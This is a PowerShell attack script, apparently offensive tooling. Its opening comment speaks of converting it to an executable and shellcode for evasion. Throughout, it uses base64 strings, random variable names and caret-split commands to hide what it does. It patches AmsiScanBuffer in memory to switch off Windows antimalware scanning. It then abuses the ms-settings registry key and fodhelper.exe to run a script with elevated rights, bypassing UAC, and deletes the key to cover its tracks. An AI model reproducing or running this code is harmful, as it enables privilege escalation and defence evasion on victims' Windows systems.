## NOW USING PS2EXE TO CONVERT IT TO .EXE AND DONUT TO CONVERT IT TO SHELLCODE, NOT TRYING TO EVADE IT BY MY HAND, LOL.

$3beba0bb61934429a13c7e299c4610be = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgc3RhdGljIGNsYXNzIEtlcm5lbDMyIHsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgbHBQcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBpbnQgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOwp9"
$29a13c7e299c4610beba2bc292e7b0b2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($3beba0bb61934429a13c7e299c4610be))
Add-Type -TypeDefinition $29a13c7e299c4610beba2bc292e7b0b2 -PassThru | Out-Null

function Get-ProcAddress {
    param ([String]$Module, [String]$Function)

    $a467a06629fd4f8e9bba2bc292e7b0b2 = [Kernel32]::GetModuleHandle($Module)
    if ($a467a06629fd4f8e9bba2bc292e7b0b2 -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to get module handle for: $Module"
        return [IntPtr]::Zero
    }

    $0f5f575099964dc8a939812fd6298aea = [Kernel32]::GetProcAddress($a467a06629fd4f8e9bba2bc292e7b0b2, $Function)
    if ($0f5f575099964dc8a939812fd6298aea -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to get function address: $Function"
        return [IntPtr]::Zero
    }

    return $0f5f575099964dc8a939812fd6298aea
}

$ee53604107594f2f8b46fb97298ab5a9 = Get-ProcAddress -Module "amsi.dll" -Function "AmsiScanBuffer"
if ($ee53604107594f2f8b46fb97298ab5a9 -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to get AmsiScanBuffer address."
    exit
}

$75277193ae5240b082f3c6d225586ff8 = Get-ProcAddress -Module "kernel32.dll" -Function "VirtualProtect"
if ($75277193ae5240b082f3c6d225586ff8 -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to get VirtualProtect address."
    exit
}

$4a9de04ab6164ad88791923a75380b53 = 0
$4725cc18365546659b0e76b2820edf6d = [Kernel32]::VirtualProtect($ee53604107594f2f8b46fb97298ab5a9, 6, 0x40, [ref]$4a9de04ab6164ad88791923a75380b53)
if (-not $4725cc18365546659b0e76b2820edf6d) {
    Write-Host "[!] VirtualProtect failed."
    exit
}

$c43e822f834146669c71d1ec0bd0a8f9 = [Byte[]](0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($c43e822f834146669c71d1ec0bd0a8f9, 0, $ee53604107594f2f8b46fb97298ab5a9, $c43e822f834146669c71d1ec0bd0a8f9.Length)

Write-Host "[+] Patched Successfully"

$shitty = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ="
$shitty2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($shitty))
$c10ea18da43749a6847617b29862e38d = $shitty2

$9unhhd0182h12d0ni0inniiio12do902 = "C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"
#$scriptPath = Join-Path $PSScriptRoot $9unhhd0182h12d0ni0inniiio12do902

$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min pow^ersh^ell -ep b^yp^as^s -fi^le `"$9unhhd0182h12d0ni0inniiio12do902`""
#new item
New-Item $c10ea18da43749a6847617b29862e38d -Force | Out-Null

$09dhu1212h09810h20hd210ii0hd120 = "RGVsZWdhdGVFeGVjdXRl"
$h89d219u2h1287uyh129hd9128u91ui = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($09dhu1212h09810h20hd210ii0hd120))
$09d09810h20hd210ii0hd120hu1212h = "KERlZmF1bHQp"
$hu2h1287uyh129hd9128u91uid219 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($09d09810h20hd210ii0hd120hu1212h))
#Set-ItemProperty
&(Get-Command s****************t-it*y) $c10ea18da43749a6847617b29862e38d -NAMe $h89d219u2h1287uyh129hd9128u91ui -VAlue ""
&(Get-Command s****************t-it*y) $c10ea18da43749a6847617b29862e38d -name $hu2h1287uyh129hd9128u91uid219 -VaLuE $459b05be8e2b43819fce3d3683c9bc53
#start-process
&(Get-Command s****************t-pr*s)  "cmd.exe" -ArGumENtList "/c s^t^ar^t fod^he^lp^er.exe" -WindowStyle Hidden

Start-Sleep 3
Remove-Item $c10ea18da43749a6847617b29862e38d -Force -Recurse -ErrorAction SilentlyContinue

Write-Host "[+] Completed"